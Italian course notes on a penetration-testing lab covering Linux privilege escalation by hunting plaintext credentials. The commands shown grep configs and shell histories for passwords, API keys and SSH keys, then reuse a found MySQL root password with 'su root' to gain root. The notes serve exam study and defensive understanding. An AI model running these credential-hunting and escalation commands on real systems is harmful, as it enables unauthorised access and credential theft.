# 014 — Locally Stored Credentials (Privilege Escalation)

> **Modulo:** Privilege Escalation · **Video:** 14/19
> **Istruttore:** Alexis Ahmed (HackerSploit / INE)
> **Fonte appunti:** [014_Locally Stored Credentials.txt](014_Locally Stored Credentials.txt) · [014_Locally Stored Credentials.srt](014_Locally Stored Credentials.srt)

## Concetti chiave

- **Apertura sezione Linux Privilege Escalation**.
- Tecnica più semplice ma estremamente comune: cercare **credenziali in chiaro** in file di configurazione di applicazioni installate (web app, DB, script).
- **Password reuse**: la password trovata in un file di config (es. DB user) viene **provata anche per gli account di sistema** (root, user privilegiati) → spesso funziona perché gli admin riusano la stessa password.
- Strategia: targeted `grep` su directory critiche come `/var/www/html`, `/etc`, `/opt`, `/home/*`.
- Risultato lab: `student` (non in `sudo`) → `grep -r db_user /var/www/html` → trovato `local_config/database.inc.php` con `root:<password>` per MySQL → `su root` con la stessa password → root sul sistema.

## Spiegazione approfondita

### Dove si nascondono le credenziali su Linux

| Posto | Cosa cercare |
|---|---|
| `/var/www/html`, `/var/www/*` | Config web app: `config.php`, `wp-config.php`, `database.inc.php`, `.env`, `settings.py` |
| `/etc/` | `/etc/mysql/`, `/etc/apache2/`, `/etc/nginx/`, `/etc/fstab` (mount credentials) |
| `/home/<user>/` | `.bash_history`, `.viminfo`, `.mysql_history`, `.ssh/id_rsa`, `.git-credentials`, `.netrc`, `.aws/credentials` |
| `/opt/` | App custom (spesso configurate male) |
| `/root/` | Se accessibile (raro) |
| `/tmp/`, `/var/tmp/` | Script temporanei, dump, backup |
| `/var/backups/`, backup `.sql`, `.tar.gz` | Dump database con hash |
| `/proc/*/environ` | Variabili d'ambiente dei processi (a volte password) |

### Pattern di ricerca utili

```bash
# Keyword classiche
grep -rni "password" /var/www/html 2>/dev/null
grep -rni "passwd"   /var/www/html 2>/dev/null
grep -rni "username" /var/www/html 2>/dev/null
grep -rni "db_user\|db_pass\|DB_USERNAME\|DB_PASSWORD" /var/www/html 2>/dev/null
grep -rni "api[_-]?key\|secret\|token" /var/www/html 2>/dev/null

# Extension targeting
find / \( -name "*.conf" -o -name "*.config" -o -name "*.ini" -o -name "*.env" -o -name "*.yml" \) 2>/dev/null | xargs grep -l -i "pass" 2>/dev/null
```

### Workflow del lab

1. Login web SSH come `student`. Verifica `whoami`, `groups` → solo gruppo `student`, **non** in `sudo`.
2. Recon mirato sul sito: `cd /var/www/html` + `ls -la`.
3. Discovery con grep: `grep -r db_user .` → output mostra `local_config/database.inc.php`.
4. `cat local_config/database.inc.php` → `db_user = root`, `db_pass = <password>`.
5. **Password reuse**: `su root` → inserire la stessa password → `id` mostra `uid=0(root)`.
6. `cat /root/flag.txt`.

### Perché funziona spesso

- Gli admin **riusano password** tra DB e sistema (cattiva pratica ma diffusa).
- File `.inc.php` spesso esclusi dalle policy di review.
- Permessi sui config file spesso `644` → leggibili a tutti.

## Comandi & strumenti

| Comando | Scopo |
|---|---|
| `whoami` / `id` / `groups` | Verifica utente corrente |
| `cat /etc/passwd` | Lista utenti del sistema |
| `cat /etc/group` | Membership gruppi (`sudo`, `wheel`, `adm`, `docker`) |
| `grep -rni "password" /var/www/html 2>/dev/null` | Ricerca ricorsiva keyword |
| `grep -r db_user /var/www/html` | Comando esatto del video |
| `find / -name "*.conf" 2>/dev/null` | Discovery file config |
| `find / -type f -name "*.bak" -o -name "*.old" 2>/dev/null` | Backup files |
| `cat ~/.bash_history` | Storia comandi (può contenere password in plaintext) |
| `cat ~/.mysql_history` | Storia MySQL CLI |
| `su <user>` | Tentativo di login con la password trovata |
| `ssh <user>@localhost` | Alternativa via SSH se shell non interattiva |
| **LinPEAS** / **LinEnum** | Discovery automatico (categoria "interesting files") |

## Esempi pratici

```bash
# 1. Recon utente
student@target:~$ whoami
student
student@target:~$ groups
student            # NON in sudo

# 2. Recon web app
student@target:~$ cd /var/www/html
student@target:/var/www/html$ ls -la

# 3. Discovery credenziali
student@target:/var/www/html$ grep -r db_user .
./local_config/database.inc.php:$db_user = "root";

student@target:/var/www/html$ cat local_config/database.inc.php
<?php
$db_host = "localhost";
$db_user = "root";
$db_pass = "S3cretP@ss";
$db_name = "appdb";
?>

# 4. Password reuse → root
student@target:~$ su root
Password: S3cretP@ss
root@target:/home/student# id
uid=0(root) gid=0(root) groups=0(root)

root@target:~# cat /root/flag.txt
```

```bash
# Pattern alternativi se grep diretto non basta
grep -rEni "(password|passwd|pwd|secret|api[_-]?key)\s*[:=]" /var/www /etc /opt 2>/dev/null
find / -type f \( -name "*.env" -o -name "wp-config.php" -o -name "settings.py" -o -name "*.inc.php" \) 2>/dev/null
cat /home/*/.bash_history 2>/dev/null
```

## Punti d'attenzione per l'esame eCPPT

- **Primo step di OGNI privesc Linux**: verifica utente/gruppi (`id`, `groups`), poi `sudo -l`, poi credentials hunting.
- **Folder prioritarie**: `/var/www/html`, `/etc/`, `/home/*`, `/opt/`, `/tmp/`.
- **Keyword di grep da memorizzare**: `password`, `passwd`, `db_user`, `db_pass`, `DB_PASSWORD`, `secret`, `api_key`, `token`.
- **Pattern `2>/dev/null`** SEMPRE quando ricerchi su tutto il fs come user low-priv (rumore di permission denied).
- **Password reuse** tra DB-utente e utente di sistema = scenario classico (e domanda d'esame).
- **`su <user>` vs `sudo -u <user>`**: `su` richiede la password dell'utente target; `sudo` quella corrente.
- Anche `/home/<user>/.ssh/id_rsa` (chiavi private senza passphrase) e `~/.netrc` (credenziali FTP/cURL) sono target classici.
- **Tool automatici**: LinPEAS è lo standard per "interesting files / credentials". Da provare quando non sai dove cercare.
- **OPSEC**: grep ricorsivi su `/` sono rumorosi (audit, alert IDS). Mirare a folder specifiche.

## Collegamenti con altri video

- Precedente: [[013_DLL Hijacking]] (fine sezione Windows).
- Prossimo: [[015_Misconfigured File Permissions]].
- Equivalente Windows: [[03_Privilege Escalation with PowerUp]] (WinLogon AutoLogon credentials), [[05_ Unattended Installation Files]], [[06_Windows Credential Manager]], [[07_ PowerShell History]].
- SUDO privileges (relativo): [[017_ Misconfigured SUDO Privileges]].
- MITRE ATT&CK: T1552.001 — *Unsecured Credentials: Credentials In Files*.
